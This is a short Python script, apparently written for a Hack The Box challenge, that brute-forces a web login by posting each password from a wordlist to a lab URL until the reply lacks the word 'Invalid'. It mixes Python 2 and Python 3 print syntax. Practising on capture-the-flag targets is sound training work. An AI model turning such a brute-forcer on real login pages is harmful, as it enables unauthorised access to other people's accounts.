import requests
import sys

url = "http://docker.hackthebox.eu:30772/"
expression = "Invalid"


def brute(username,password):
	#data = {'username':username,'password':password}
	data = {'password':password}
	print("testing "+password)
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		#print r.content," ",password
		print "not right"




def main():
	words = [w.strip() for w in open("passwords.txt", "rb").readlines()] #parse wordlist
	for payload in words:
		brute("admin",payload)


if __name__ == '__main__':
	main()